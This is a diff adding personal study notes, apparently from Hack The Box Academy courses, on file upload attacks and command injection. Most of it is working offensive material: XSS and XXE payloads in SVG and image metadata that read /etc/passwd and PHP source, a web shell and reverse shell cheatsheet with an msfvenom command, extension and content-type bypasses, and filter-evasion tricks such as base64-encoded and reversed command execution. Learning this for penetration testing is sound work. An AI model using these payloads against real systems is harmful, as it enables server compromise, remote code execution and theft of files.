@@ -4249,3 +4249,229 @@ Tamper scripts can modify any part of the request, although the majority change 
 ### Complete
 
 [Link of Completion](https://academy.hackthebox.com/achievement/713396/23)
+
+## File Upload Attacks
+
+### XSS
+
+The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.
+
+Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:
+
+```sh
+woadey@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+woadey@htb[/htb]$ exiftool HTB.jpg
+...SNIP...
+Comment                         :  "><img src=1 onerror=alert(window.origin)>
+```
+
+XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to HTB.svg:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+### XXE
+
+Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source. Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.
+
+While reading systems files like `/etc/passwd` can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to `locate the upload directory, identify allowed extensions, or find the file naming scheme`, which may become handy for further exploitation.
+
+To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code.
+
+### Cheatsheet
+
+**Web Shells**
+
+| Web Shell                                                                                | Description                           |
+| ---------------------------------------------------------------------------------------- | ------------------------------------- |
+| `<?php file_get_contents('/etc/passwd'); ?>`                                             | Basic PHP File Read                   |
+| `<?php system('hostname'); ?>`                                                           | Basic PHP Command Execution           |
+| `<?php system($_REQUEST['cmd']); ?>`                                                     | Basic PHP Web Shell                   |
+| `<% eval request('cmd') %>`                                                              | Basic ASP Web Shell                   |
+| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`           | Generate PHP reverse shell            |
+| [phpbash](https://github.com/Arrexel/phpbash)                                            | PHP Web Shell                         |
+| [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)                  | PHP Reverse Shell                     |
+| [SecLists Web Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |
+
+**Bypasses**
+
+| Command                                                                                                                                    | Description                                  |
+| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
+| **Client-Side Bypass**                                                                                                                     |                                              |
+| `[CTRL+SHIFT+C]`                                                                                                                           | Toggle Page Inspector                        |
+| **Blacklist Bypass**                                                                                                                       |                                              |
+| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
+| `shell.pHp`                                                                                                                                | Case Manipulation                            |
+| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
+| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
+| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
+| **Whitelist Bypass**                                                                                                                       |                                              |
+| `shell.jpg.php`                                                                                                                            | Double Extension                             |
+| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
+| `%20, %0a, %00, %0d0a, /, .\, ., …`                                                                                                        | Character Injection - Before/After Extension |
+
+**Content/Type Bypass**
+
+| Command                                                                                                                     | Description                         |
+| --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
+| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)              | List of Web Content-Types           |
+| [All Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types           |
+| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                    | List of File Signatures/Magic Bytes |
+
+**Limited Uploads**
+
+| Potential Attack | File Types              |
+| ---------------- | ----------------------- |
+| XSS              | HTML, JS, SVG, GIF      |
+| XXE/SSRF         | XML, SVG, PDF, PPT, DOC |
+| DoS              | ZIP, JPG, PNG           |
+
+### Complete
+
+[Link of Completion](https://academy.hackthebox.com/achievement/713396/136)
+
+## Command Injections
+
+### [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+
+**Install**
+
+```sh
+woadey@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
+woadey@htb[/htb]$ cd Bashfuscator
+woadey@htb[/htb]$ pip3 install setuptools==65
+woadey@htb[/htb]$ python3 setup.py install --user
+```
+
+\*Example\*\*
+
+```sh
+woadey@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+
+[+] Mutators used: Token/ForCode
+[+] Payload:
+eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
+[+] Payload size: 104 characters
+```
+
+### [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
+
+**Install**
+
+```powershell
+PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+PS C:\htb> cd Invoke-DOSfuscation
+PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
+PS C:\htb> Invoke-DOSfuscation
+Invoke-DOSfuscation> help
+
+HELP MENU :: Available options shown below:
+[*]  Tutorial of how to use this tool             TUTORIAL
+...SNIP...
+
+Choose one of the below options:
+[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
+[*] ENCODING    Environment variable encoding
+[*] PAYLOAD     Obfuscated payload via DOSfuscation
+```
+
+**Example**
+
+```powershell
+Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation> encoding
+Invoke-DOSfuscation\Encoding> 1
+
+...SNIP...
+Result:
+typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+```
+
+### Cheatsheet
+
+**Injection Operators**
+
+| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |
+| ------------------ | ------------------- | --------------------- | ------------------------------------------ |
+| Semicolon          | ;                   | %3b                   | Both                                       |
+| New Line           | \n                  | %0a                   | Both                                       |
+| Background         | &                   | %26                   | Both (second output generally shown first) |
+| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
+| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
+| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
+| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                          |
+| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |
+
+**Linux Filtered Character Bypass**
+
+| Code                  | Description                                                                      |
+| --------------------- | -------------------------------------------------------------------------------- |
+| printenv              | Can be used to view all environment variables                                    |
+| %09                   | Using tabs instead of spaces                                                     |
+| ${IFS}                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
+| {ls,-la}              | Commas will be replaced with spaces                                              |
+| ${PATH:0:1}           | Will be replaced with /                                                          |
+| ${LS_COLORS:10:1}     | Will be replaced with ;                                                          |
+| $(tr '!-}' '"-~'<<<[) | Shift character by one ([ -> \)                                                  |
+
+**Linux Blacklisted Command Bypass**
+
+| Code                                                       | Description                         |
+| ---------------------------------------------------------- | ----------------------------------- |
+| ' or "                                                     | Total must be even                  |
+| $@ or \                                                    | Linux only                          |
+| $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")                           | Execute command regardless of cases |
+| $(a="WhOaMi";printf %s "${a,,}")                           | Another variation of the technique  |
+| echo 'whoami' \| rev                                       | Reverse a string                    |
+| $(rev<<<'imaohw')                                          | Execute reversed command            |
+| echo -n 'cat /etc/passwd \| grep 33' \| base64             | Encode a string with base64         |
+| bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) | Execute b64 encoded string          |
+
+**Windows Filtered Character Bypass**
+
+| Code                  | Description                                                |
+| --------------------- | ---------------------------------------------------------- |
+| Get-ChildItem Env:    | Can be used to view all environment variables (PowerShell) |
+| %09                   | Using tabs instead of spaces                               |
+| %PROGRAMFILES:~10,-5% | Will be replaced with a space (CMD)                        |
+| $env:PROGRAMFILES[10] | Will be replaced with a space (PowerShell)                 |
+| %HOMEPATH:~0,-17%     | Will be replaced with \ (CMD)                              |
+| $env:HOMEPATH[0]      | Will be replaced with \ (PowerShell)                       |
+
+**Windows Blacklisted Command Bypass**
+
+| Code                                                                                                       | Description                              |
+| ---------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
+| ' or "                                                                                                     | Total must be even                       |
+| ^                                                                                                          | Windows only (CMD)                       |
+| WhoAmi                                                                                                     | Simply send the character with odd cases |
+| "whoami"[-1..-20] -join ''                                                                                 | Reverse a string                         |
+| iex "$('imaohw'[-1..-20] -join '')"                                                                        | Execute reversed command                 |
+| [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))                              | Encode a string with base64              |
+| iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" | Execute b64 encoded string               |
+
+### Complete
+
+[Link of Completion](https://academy.hackthebox.com/achievement/713396/109)
